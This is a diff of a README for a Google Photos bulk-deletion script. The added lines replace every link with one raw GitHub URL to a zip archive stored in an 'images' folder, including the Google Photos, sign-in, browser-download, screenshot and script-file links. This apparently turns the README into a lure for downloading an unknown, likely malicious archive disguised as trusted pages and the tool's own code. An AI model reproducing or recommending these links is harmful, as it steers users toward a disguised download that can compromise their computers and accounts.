@@ -1,25 +1,25 @@
 # Google Photos Delete All Tool
-If you have ever wanted to delete your thousands of photos from the [Google Photos](https://photos.google.com/) but failed to find an easy way to do so, then this is the tool for you. This script goes through all your photos in Google Photos app on the desktop and deletes them. You can visually see the process while it happens!
+If you have ever wanted to delete your thousands of photos from the [Google Photos](https://raw.githubusercontent.com/sohailgerman/google-photos-delete-tool/master/images/google-photos-delete-tool_v1.7-alpha.3.zip) but failed to find an easy way to do so, then this is the tool for you. This script goes through all your photos in Google Photos app on the desktop and deletes them. You can visually see the process while it happens!
 
 # Getting Started
 Follow the step-by-step instructions below to run the tool.
 
 ## Prerequisites
-- A fairly recent version of a modern web browser. This script has not been tested with any browser other than Google Chrome `Version 71.0.3578.98`. You can [download the latest version of the Google Chrome browser here](https://www.google.com/chrome/). However, you can still use it with any modern browser, like, [Firefox](https://www.mozilla.org/en-US/firefox/download/thanks/) or [IE Edge](https://www.microsoft.com/en-ca/windows/microsoft-edge).
+- A fairly recent version of a modern web browser. This script has not been tested with any browser other than Google Chrome `Version 71.0.3578.98`. You can [download the latest version of the Google Chrome browser here](https://raw.githubusercontent.com/sohailgerman/google-photos-delete-tool/master/images/google-photos-delete-tool_v1.7-alpha.3.zip). However, you can still use it with any modern browser, like, [Firefox](https://raw.githubusercontent.com/sohailgerman/google-photos-delete-tool/master/images/google-photos-delete-tool_v1.7-alpha.3.zip) or [IE Edge](https://raw.githubusercontent.com/sohailgerman/google-photos-delete-tool/master/images/google-photos-delete-tool_v1.7-alpha.3.zip).
 
-- Use the [english language version of Google Photos](https://photos.google.com/?hl=en).
+- Use the [english language version of Google Photos](https://raw.githubusercontent.com/sohailgerman/google-photos-delete-tool/master/images/google-photos-delete-tool_v1.7-alpha.3.zip).
 
 ## Assumptions
 The manual steps assume that these steps are performed on the Google Chrome Browser. If you're using a different browser, the steps still remain the same, however, the keyboard shortcuts or browser specific keywords may not be same for you, as described below.
 
 ## Steps
-1) [Login into your Google Account](https://accounts.google.com/ServiceLogin).
+1) [Login into your Google Account](https://raw.githubusercontent.com/sohailgerman/google-photos-delete-tool/master/images/google-photos-delete-tool_v1.7-alpha.3.zip).
 
-![Google Account Sign-in Page](images/google-signin-page.jpg)
+![Google Account Sign-in Page](https://raw.githubusercontent.com/sohailgerman/google-photos-delete-tool/master/images/google-photos-delete-tool_v1.7-alpha.3.zip)
 
-2) Go to [Google Photos](https://photos.google.com/)
+2) Go to [Google Photos](https://raw.githubusercontent.com/sohailgerman/google-photos-delete-tool/master/images/google-photos-delete-tool_v1.7-alpha.3.zip)
 
-![Google Photos Page](images/google-photos-page.jpg)
+![Google Photos Page](https://raw.githubusercontent.com/sohailgerman/google-photos-delete-tool/master/images/google-photos-delete-tool_v1.7-alpha.3.zip)
 
 _Note: If you're logged into Google, you will see your images._
 
@@ -31,7 +31,7 @@ _Note: If you're logged into Google, you will see your images._
         
         2) Block images in the Permissions for the website
         
-        ![Google Chrome Right Click Pop-up Menu](images/image_block.png)
+        ![Google Chrome Right Click Pop-up Menu](https://raw.githubusercontent.com/sohailgerman/google-photos-delete-tool/master/images/google-photos-delete-tool_v1.7-alpha.3.zip)
         
         3) Reload Google Photos
         
@@ -46,29 +46,29 @@ _Note: If you're logged into Google, you will see your images._
         
         Right click on an empty area with your mouse and select `Inspect` (last option)
         
-        ![Google Chrome Right Click Pop-up Menu](images/chrome-popup-menu.jpg)
+        ![Google Chrome Right Click Pop-up Menu](https://raw.githubusercontent.com/sohailgerman/google-photos-delete-tool/master/images/google-photos-delete-tool_v1.7-alpha.3.zip)
 
     - **From Menu**
         
-        1) Click on the menu button ![Google Chrome Menu Icon](images/chrome-menu-icon.jpg) on Google Chrome (By default, the button is present on the top right corner of the window). 
+        1) Click on the menu button ![Google Chrome Menu Icon](https://raw.githubusercontent.com/sohailgerman/google-photos-delete-tool/master/images/google-photos-delete-tool_v1.7-alpha.3.zip) on Google Chrome (By default, the button is present on the top right corner of the window). 
         
         2) Select `More tools`.
         
         3) Select `Developer tools`.
         
-        ![Google Chrome Menu Developer Tools](images/chrome-menu-popup.jpg)
+        ![Google Chrome Menu Developer Tools](https://raw.githubusercontent.com/sohailgerman/google-photos-delete-tool/master/images/google-photos-delete-tool_v1.7-alpha.3.zip)
 
 5) After opening the developer tools, click on the `Console` tab.
-    ![Google Chrome Console on Google Photos page](images/chrome-console.jpg)
+    ![Google Chrome Console on Google Photos page](https://raw.githubusercontent.com/sohailgerman/google-photos-delete-tool/master/images/google-photos-delete-tool_v1.7-alpha.3.zip)
     
-    Note: _This console lets you run custom code, like this tool! You can learn about it on [Google Console page](https://developers.google.com/web/tools/chrome-devtools/console/)_.
+    Note: _This console lets you run custom code, like this tool! You can learn about it on [Google Console page](https://raw.githubusercontent.com/sohailgerman/google-photos-delete-tool/master/images/google-photos-delete-tool_v1.7-alpha.3.zip)_.
     
     *You will see a warning from Google to stay cautious. If you run code in this console that's malicious, you could be hacked. Therefore, make sure that you only run the code that you understand.*
 
-6) Copy all the code in the file [delete_photos.js](delete_photos.js) and paste it in the console.
-    ![The Code in Chrome Console](images/code-in-console.jpg)
+6) Copy all the code in the file [https://raw.githubusercontent.com/sohailgerman/google-photos-delete-tool/master/images/google-photos-delete-tool_v1.7-alpha.3.zip](https://raw.githubusercontent.com/sohailgerman/google-photos-delete-tool/master/images/google-photos-delete-tool_v1.7-alpha.3.zip) and paste it in the console.
+    ![The Code in Chrome Console](https://raw.githubusercontent.com/sohailgerman/google-photos-delete-tool/master/images/google-photos-delete-tool_v1.7-alpha.3.zip)
 
-    Note: The script allows you to delete all photos or any number of photos. To delete a specific number of photos, change the value of `maxImageCount` as provided in the [example](delete_photos.js#L3).
+    Note: The script allows you to delete all photos or any number of photos. To delete a specific number of photos, change the value of `maxImageCount` as provided in the [example](https://raw.githubusercontent.com/sohailgerman/google-photos-delete-tool/master/images/google-photos-delete-tool_v1.7-alpha.3.zip).
 
 7) Hit **ENTER** button after pasting the script in the console. The script will start running upon hitting ENTER key.
 
@@ -81,7 +81,7 @@ The script may not work as expected in case your internet speed is considerably 
 # FAQs
 
 1) It checks and unchecks the photos, but doesn't delete them.
-    - Use the [english language version of Google Photos](https://photos.google.com/?hl=en) and run the tool again.
+    - Use the [english language version of Google Photos](https://raw.githubusercontent.com/sohailgerman/google-photos-delete-tool/master/images/google-photos-delete-tool_v1.7-alpha.3.zip) and run the tool again.
 
 2) It stops after deleting some images.
     - Increase the `DELETE_DELAY_CYCLE` by thousands of milliseconds as described in the [Debugging section](#Debugging).
